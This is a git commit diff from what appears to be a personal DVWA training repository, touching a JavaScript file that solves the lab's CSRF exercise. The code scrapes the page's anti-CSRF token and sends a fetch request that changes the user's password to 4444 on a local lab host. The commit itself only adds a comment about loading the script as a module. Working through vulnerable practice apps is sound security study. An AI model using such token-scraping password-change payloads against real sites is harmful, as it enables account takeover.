b55455ffcd3f211f68638a5322a9a586c5111cfe
vansteki <vansteki.tw@gmail.com>
2022-02-26 16:04:49 +0800

    refactor: rev

--- DVWA/3.csrf/csrf-fetch.js
+++ DVWA/3.csrf/csrf-fetch.js
@@ -3,3 +3,5 @@ const token = csrfPage.match(/'user_token' value='(.*)'/i)[1]
 const password = 4444
 const url = `http://dvwa.localtest/vulnerabilities/csrf/?password_new=${password}&password_conf=${password}&Change=Change&user_token=${token}`
 await fetch(url).then(async (res) => res.text())
+
+// use <script type="module" src="..."></script> to require this script
